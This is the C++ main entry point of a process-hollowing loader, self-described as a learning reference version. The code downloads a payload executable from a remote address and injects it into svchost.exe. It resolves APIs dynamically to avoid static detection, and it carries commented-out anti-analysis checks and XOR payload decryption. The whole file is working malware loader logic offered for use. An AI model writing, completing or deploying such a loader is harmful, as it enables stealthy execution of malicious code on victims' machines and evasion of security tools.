#include "include/Common.h"
#include "include/Network.h"
#include "include/PEParser.h"
#include "include/Security.h"
#include "include/HollowingCore.h"

/**
 * @brief 进程镂空程序主入口
 */
int main(int argc, char* argv[]) {
    // 默认配置
    std::string url = "http://192.168.110.130:8000/payload.exe"; 
    std::string target = "C:\\Windows\\System32\\svchost.exe";

    // 支持命令行参数覆盖默认配置
    if (argc > 1) {
        url = argv[1];
    }
    if (argc > 2) {
        target = argv[2];
    }

    LOG_INFO("=== 模块化进程镂空工具 (学习参考版) ===");
    LOG_INFO("目标宿主进程: " + target);
    LOG_INFO("Payload 来源: " + url);

    // 1. 初始化: 解析动态 API 地址 (避免 IAT 静态特征)
    if (!Hollowing::APIResolver::GetInstance().ResolveAll()) {
        LOG_ERROR("系统 API 解析失败，请检查操作系统版本");
        return 1;
    }

    // 2. 安全检查: 尝试检测分析环境
    // if (Hollowing::Security::CheckAnalysis()) {
    //     LOG_ERROR("检测到潜在的分析环境，为保护安全，程序将退出...");
    //     return 1;
    // }

    // 3. 网络下载: 从远程获取 Payload
    std::vector<BYTE> peData;
    if (!Hollowing::Network::DownloadPE(url, peData)) {
        LOG_ERROR("无法获取 Payload 数据");
        return 1;
    }

    // 4. (可选) 解密: 如果你的 Payload 是加密的，请取消下行注释
    // Hollowing::Security::XORCipher(peData, "MySecretKey123");

    // 5. PE 验证: 确保下载的数据是有效的 Windows 可执行文件
    Hollowing::PE_INFO peInfo;
    if (!Hollowing::PEParser::Parse(peData, peInfo)) {
        LOG_ERROR("Payload 格式验证失败");
        return 1;
    }

    // 6. 核心攻击: 执行进程镂空技术
    if (Hollowing::HollowingCore::PerformHollowing(target, peInfo)) {
        LOG_INFO("恭喜！进程镂空操作已成功执行。");
    } else {
        LOG_ERROR("镂空操作失败，详情请查看上方调试日志。");
    }

    LOG_INFO("任务结束，正在清理并退出...");
    return 0;
}
